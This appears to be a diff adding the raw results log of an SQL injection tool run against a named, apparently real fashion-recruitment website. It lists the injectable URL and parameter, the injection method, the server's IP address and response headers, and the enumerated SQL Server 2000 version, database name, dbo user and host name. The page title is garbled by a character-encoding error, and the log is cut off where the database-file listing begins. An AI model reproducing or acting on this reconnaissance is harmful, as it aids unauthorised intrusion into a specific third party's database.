@@ -1,0 +1,41 @@
+■漏洞信息:============================================================
+ ·URL:http://www.fashionin.com/fashionin/Empinfo/baseinfo/EmpInfoView.asp?ID=&CID=lht01813&SeqNo=9
+ ·页面标题：悼剧皋捞历⑦-攫歹傀绢 权碱俏 扁裙 棺 款康MD 版仿磊 盲侩傍绊
+ ·参数:ID=&CID=lht01813&SeqNo=9
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:121.254.168.84
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Length: 34568
+Content-Type: text/html
+Server: Microsoft-IIS/7.5
+Set-Cookie: ASPSESSIONIDSSBRQADT=NPEEFGAAIKFCJAALPHPJHJEL; path=/
+X-Powered-By: ASP.NET
+Date: Mon, 04 Apr 2011 07:38:06 GMT
+Connection: close
+
+
+
+■数据库信息:============================================================
+- 数据库名：fashionin
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：WINNT85
+- 服务名：MSSQLSERVER
+- 系统用户名：fashionin
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
